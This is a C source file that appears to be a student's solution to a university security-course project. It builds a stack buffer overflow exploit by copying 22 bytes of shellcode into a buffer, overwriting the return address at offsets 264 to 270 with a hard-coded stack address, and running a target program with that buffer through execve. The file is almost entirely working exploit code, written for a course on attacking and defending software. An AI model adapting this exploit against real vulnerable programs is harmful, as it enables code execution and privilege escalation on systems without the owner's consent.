#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// replace this define environment to have the correct path of your own target code
#define TARGET "/home/net/jo798048/homework/CAP6135-project1-source/targets/target"

int main(void)
{
    char* args[3];
    char* env[2];
    char* tmp = NULL;

    // Creating an input buffer that can cause buffer overflow in strcpy function in the target.c executable code
    int buffSize = 1000; char buff[buffSize];
    // Intialize buffer elements to 0x01
    int i;   for (i = 0; i < buffSize; i++)         buff[i] = 0x01;

    // write your code below to fill the 22 bytes shellcode into the buff variable, and
    // at the correct location overwrite the return address correctly in order to achieve stack overflow
    // Your own code starts here:
    int j; for (j = 0; j < 22; j++) buff[j] = shellcode[j];
    buff[264] = 0xb0; buff[265] = 0xea;
    buff[266] = 0xff; buff[267] = 0xff;
    buff[268] = 0xff; buff[269] = 0x7f;
    buff[270] = 0x00;
    // Your code ends here.

    // prepare command line input to execute target code
    args[0] = TARGET; // you must have already compiled and generated the target executable code first
    args[1] = buff; // the first input parameter to the target code (artfully crafted buffer overflow string)
    args[2] = NULL;
    env[0] = "FOO=bar";
    env[1] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");
    return 0;
}
